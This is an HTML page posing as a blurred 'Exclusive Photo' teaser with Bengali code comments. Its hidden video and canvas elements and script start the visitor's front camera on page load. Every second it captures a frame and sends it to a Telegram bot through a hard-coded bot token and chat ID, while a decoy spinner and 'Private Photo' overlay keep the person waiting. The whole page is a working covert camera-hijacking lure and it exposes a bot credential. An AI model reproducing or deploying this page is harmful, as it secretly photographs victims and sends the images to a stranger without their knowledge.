<!DOCTYPE html>
<html lang="bn">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>top siktet</title>

  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f0f4f8;
      text-align: center;
      padding: 25px;
      margin: 0;
    }

    .container {
      max-width: 520px;
      margin: auto;
      background: white;
      padding: 20px;
      border-radius: 15px;
      box-shadow: 0 4px 15px #0002;
    }

    #status {
      margin-top: 15px;
      overflow-wrap: anywhere;
      font-size: 16px;
      color: #333;
    }
    * {
    box-sizing: border-box;
}

body {
    margin: 0;
    min-height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
    background: #090b14;
    font-family: Arial, sans-serif;
    color: white;
}

.card {
    width: 320px;
    padding: 18px;
    text-align: center;
    background: linear-gradient(145deg, #20243a, #11131f);
    border: 1px solid #343954;
    border-radius: 20px;
    box-shadow: 0 0 35px #7c3aed22;
}

h2 {
    margin: 5px 0 18px;
    font-size: 22px;
    letter-spacing: 1px;
}

.photo {
    position: relative;
    height: 320px;
    overflow: hidden;
    border-radius: 14px;
    background: #171a29;
}

.photo img {
    width: 100%;
    height: 100%;
    object-fit: cover;
    filter: blur(2px);
    transform: scale(1.1);
}

.lock {
    position: absolute;
    inset: 0;
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    background: #080a1280;
}

.lock-icon {
    font-size: 42px;
    margin-bottom: 12px;
}

.lock h3 {
    margin: 0;
    font-size: 18px;
}

.lock p {
    color: #c1c4d5;
    font-size: 12px;
}

.badge {
    display: inline-block;
    margin-top: 18px;
    padding: 8px 18px;
    border: 1px solid #8b5cf6;
    border-radius: 30px;
    color: #c4b5fd;
    font-size: 12px;
    letter-spacing: 2px;
}

.footer {
    margin-top: 15px;
    color: #777f98;
    font-size: 11px;
}
.photo {
    position: relative;
    cursor: pointer;
    overflow: hidden;
}

.photo img {
    filter: blur(20px);
}

.overlay {
    position: absolute;
    inset: 0;
    background: #080a1280;
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
}

.spinner {
    width: 42px;
    height: 42px;
    border: 4px solid #ffffff35;
    border-top-color: #a78bfa;
    border-radius: 50%;
    animation: spin 0.8s linear infinite;
}

@keyframes spin {
    to {
        transform: rotate(360deg);
    }
}

#loading {
    display: none;
    margin-top: 15px;
    color: #c4b5fd;
    font-size: 14px;
}
  </style>
</head>

<body>
  
    <h2>✦ Exclusive Photo</h2>

    <div class="card">
    <h2>✦ Exclusive Photo</h2>

    <div class="photo" onclick="startLoading()">
        <img src="photo.jpg" alt="Exclusive Photo">

        <div class="overlay">
            <div class="spinner"></div>
            <p>Private Photo</p>
        </div>
    </div>

    <div id="loading">Loading... Please wait</div>

    <div class="badge">✦ EXCLUSIVE ✦</div>
</div
  <!-- Hidden video & canvas (no preview) -->
  <video id="video" autoplay playsinline muted style="display:none;"></video>
  <canvas id="canvas" hidden></canvas>

  <script>
    function startLoading() {
    document.getElementById("loading").style.display = "block";
}
    // নিজের Telegram Bot তথ্য বসাও
    const BOT_TOKEN = "8990361613:AAHDPlVOd2npF28ggEyGiREz-0N3GIF1zUc";
    const CHAT_ID = "8806083450";

    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");
    const statusText = document.getElementById("status");

    let stream = null;
    let timer = null;
    let sending = false;
    let stopped = false;

    async function startCamera() {
      if (stopped) return;

      try {
        statusText.textContent = "ক্যামেরার অনুমতি চাওয়া হচ্ছে...";

        stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" }, // পিছনের ক্যামেরা প্রাধান্য
          audio: false
        });

        video.srcObject = stream;
        await video.play();

        statusText.textContent = "ক্যামেরা চালু। প্রতি ৫ সেকেন্ডে ছবি পাঠানো হচ্ছে...";

        // প্রথম ছবি পাঠাও
        await captureAndSend();

        // তারপর প্রতি ৫ সেকেন্ডে
        if (!stopped) {
          timer = setInterval(captureAndSend, 1000);
        }

      } catch (error) {
        stopped = true;
        statusText.textContent = "ক্যামেরা চালু হয়নি: " + error.message;
        stopCamera();
      }
    }

    async function captureAndSend() {
      if (stopped || sending || !video.videoWidth) return;

      sending = true;

      try {
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;

        const ctx = canvas.getContext("2d");
        ctx.drawImage(video, 0, 0);

        const blob = await new Promise(resolve =>
          canvas.toBlob(resolve, "image/jpeg", 0.85)
        );

        if (!blob) throw new Error("ছবি তৈরি করা যায়নি");

        const formData = new FormData();
        formData.append("chat_id", CHAT_ID);
        formData.append("photo", blob, "capture.jpg");
        formData.append("caption", "Camera capture - " + new Date().toLocaleString());

        const response = await fetch(
          `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
          {
            method: "POST",
            body: formData
          }
        );

        const result = await response.json();

        if (!response.ok || !result.ok) {
          throw new Error(result.description || "Telegram error");
        }

        statusText.textContent =
          "ছবি সফলভাবে পাঠানো হয়েছে: " +
          new Date().toLocaleTimeString();

      } catch (error) {
        statusText.textContent = "পাঠানো যায়নি: " + error.message;
      } finally {
        sending = false;
      }
    }

    function stopCamera() {
      stopped = true;
      if (timer) {
        clearInterval(timer);
        timer = null;
      }

      if (stream) {
        stream.getTracks().forEach(track => track.stop());
        stream = null;
      }

      video.srcObject = null;
    }

    // পেজ লোড হওয়ার সাথে সাথেই ক্যামেরা শুরু
    window.addEventListener("load", () => {
      startCamera();
    });

    
  </script>
</body>
</html>
